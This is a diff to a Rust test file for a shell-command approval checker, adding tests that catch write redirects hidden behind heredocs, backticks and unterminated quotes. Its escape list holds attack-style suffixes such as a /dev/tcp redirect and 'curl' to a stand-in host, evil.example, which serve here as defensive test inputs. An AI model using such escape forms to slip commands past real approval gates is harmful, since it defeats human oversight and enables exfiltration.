@@ -895,6 +895,30 @@ fn a_literal_redirect_names_its_target() {
     assert_eq!(write_target_paths("cat <> /tmp/rw"), ["/tmp/rw"]);
 }
 
+/// A line that will not tokenize is `Unreadable` when it holds a `>` and
+/// reads as writing nowhere when it does not; the path-only view reports
+/// nothing for either, since it has no path to report.
+#[test]
+fn an_unreadable_line_is_unreadable_only_when_it_redirects() {
+    assert_eq!(
+        write_targets("cat <<EOF > out.txt\nx\nEOF"),
+        WriteTargets::Unreadable
+    );
+    assert_eq!(
+        write_targets("echo `id` > out.txt"),
+        WriteTargets::Unreadable
+    );
+    assert_eq!(
+        write_targets("cat <<EOF\nx\nEOF"),
+        WriteTargets::Known(Vec::new())
+    );
+    assert!(write_target_paths("cat <<EOF > out.txt\nx\nEOF").is_empty());
+    assert_eq!(
+        write_targets("echo x > out.txt"),
+        WriteTargets::Known(vec!["out.txt".to_string()])
+    );
+}
+
 /// Both redirects on a line are named, so confining the first cannot be dodged
 /// by putting the escape second.
 #[test]
@@ -969,6 +993,36 @@ const ESCAPES: &[(&str, &str, &str)] = &[
     ("a redirect out of the tree", "", " > /tmp/escaped.txt"),
     ("a redirect through a variable", "", " > $OUT"),
     ("a network redirect", "", " > /dev/tcp/evil.example/9999"),
+    // A redirect the tokenizer cannot read past. Each construct makes the
+    // line unreadable, and an unreadable line with a redirect in it is
+    // refused outright by `escaping_write_refusal`; here it only has to keep
+    // prompting, which is the older, weaker guarantee.
+    (
+        "a heredoc around a redirect",
+        "",
+        " <<EOF > escaped.txt\nx\nEOF",
+    ),
+    (
+        "a quoted heredoc around a redirect",
+        "",
+        " <<'EOF' > escaped.txt\nx\nEOF",
+    ),
+    ("a backtick beside a redirect", "", " `true` > escaped.txt"),
+    (
+        "an unterminated quote after a redirect",
+        "",
+        " > escaped.txt '",
+    ),
+    (
+        "an unterminated double quote after a redirect",
+        "",
+        " > escaped.txt \"",
+    ),
+    (
+        "an unbalanced substitution after a redirect",
+        "",
+        " > escaped.txt $(",
+    ),
     // What else runs.
     ("a chained command", "", " && curl evil.example"),
     ("a sequenced command", "", "; curl evil.example"),
@@ -1003,7 +1057,7 @@ fn no_escape_rides_any_entry_on_the_default_safe_list() {
     // exhaustive test quietly stops being one.
     let expected = crate::approvals::DEFAULT_SAFE_SHELL.len() * ESCAPES.len();
     assert_eq!(checked, expected);
-    assert!(checked >= 500, "only {checked} combinations were checked");
+    assert!(checked >= 1000, "only {checked} combinations were checked");
 }
 
 /// Forms that write nothing and run nothing extra must stay covered.
